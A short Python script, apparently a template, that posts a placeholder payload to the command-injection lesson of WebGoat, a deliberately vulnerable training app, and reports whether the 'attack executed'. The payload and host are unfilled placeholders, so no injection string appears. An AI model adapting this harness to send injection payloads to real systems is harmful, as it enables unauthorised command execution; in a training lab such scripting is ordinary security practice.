import requests

webgoat_url = "http://__HOST_IP__:8080/WebGoat/CommandInjection/attack"
payload = "__PAYLOAD__"

data = {
    "inputField": payload
}

response = requests.post(webgoat_url, data=data)
if response.status_code == 200:
    print("[+] Command Injection attack executed!")
    print(response.text)
else:
    print(f"[-] Attack failed! HTTP Status Code: {response.status_code}")

